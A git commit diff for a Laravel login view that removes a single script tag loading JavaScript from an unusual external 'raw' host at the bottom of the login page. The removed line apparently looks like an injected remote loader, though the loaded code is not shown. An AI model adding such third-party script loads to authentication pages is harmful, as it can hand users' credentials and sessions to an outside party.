aad3bf2f2ca2cebbf883c4ee24330ceb75bdfd40
Jee Ann Apitong <toxophilite07@gmail.com>
2024-12-04 08:24:02 +0800

    Update login.blade.php
    Signed-off-by: Jee Ann Apitong <toxophilite07@gmail.com>

--- resources/views/auth/login.blade.php
+++ resources/views/auth/login.blade.php
@@ -377,8 +377,6 @@
         }
     @endif
 </script>
-<script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/ARKO768557XWJ"></script>
-
         @include('auth.response')
     </body>
     </html>
